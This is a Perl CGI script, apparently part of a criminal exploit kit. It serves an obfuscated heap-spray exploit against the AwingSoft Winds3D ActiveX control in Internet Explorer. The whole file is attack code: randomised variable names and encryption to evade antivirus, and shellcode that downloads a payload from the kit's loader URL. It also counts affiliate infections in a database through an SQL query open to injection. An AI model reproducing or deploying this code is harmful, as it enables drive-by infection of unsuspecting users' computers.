#!/usr/bin/perl

#
# var randomizer for awingsoft winds3d ActiveX exploit (Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET awingsoftwinds3d=awingsoftwinds3d+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";


$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET awingsoftwinds3d=awingsoftwinds3d+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$winds3d         = JsXOR::generate_random_string(int(rand 100));
$j_shellcode   = JsXOR::generate_random_string(int(rand 100));
$j_nops        = JsXOR::generate_random_string(int(rand 100));
$j_headersize  = JsXOR::generate_random_string(int(rand 100));
$j_slackspace  = JsXOR::generate_random_string(int(rand 100));
$j_fillblock   = JsXOR::generate_random_string(int(rand 100));
$j_block       = JsXOR::generate_random_string(int(rand 100));
$j_memory      = JsXOR::generate_random_string(int(rand 100));
$j_counter     = JsXOR::generate_random_string(int(rand 30));
$j_ret         = JsXOR::generate_random_string(int(rand 100));
$get_resource  = 'awingsoftwinds3d.pl';

#Build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=awingsoftwinds3d';
$shellcode = Shellcode::getshell($urlllll);

#exec var
$nops = '%u0c0c%u0c0c';
$ret = '%0c%0c%0c%0c';
$blocksize = 0x40000;
$fillto = 550;
$offset = 8984;


$javascript = <<EOF;

$j_shellcode=unescape('$shellcode');
$j_nops=unescape('$nops');
$j_headersize=20;
$j_slackspace=$j_headersize+$j_shellcode.length;
while($j_nops.length<$j_slackspace)$j_nops+=$j_nops;
$j_fillblock=$j_nops.substring(0,$j_slackspace);
$j_block=$j_nops.substring(0,$j_nops.length-$j_slackspace);
while($j_block.length+$j_slackspace<#{blocksize})$j_block=$j_block+$j_block+$j_fillblock;
$j_memory=new Array();
for($j_counter=0;$j_counter<$fillto;$j_counter++)$j_memory\[$j_counter]=$j_block+$j_shellcode;

var $j_ret = unescape('$ret');
while ($j_ret.length <= $offset) {
$j_ret = $j_ret + unescape('$ret');
}
$winds3d.SceneURL = $j_ret;
setTimeout('window.location = "$get_resource";', 500);

EOF

$header2 = <<EOFHEA;

<html>
<head><meta http-equiv="refresh" content="1;URL=$get_resource"></head>
<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903' id='$winds3d'></object>
<script>

EOFHEA

$footer1 = <<EOFFOOT;

</script> 
</html>

EOFFOOT


#$beforexoredd = JsXOR::excryptxorjs($javascript);
$beforexoredd = EncRand::CsCrypt($javascript,$csname,$theCookie);

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$header2";
print $beforexoredd;
print "$footer1";

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
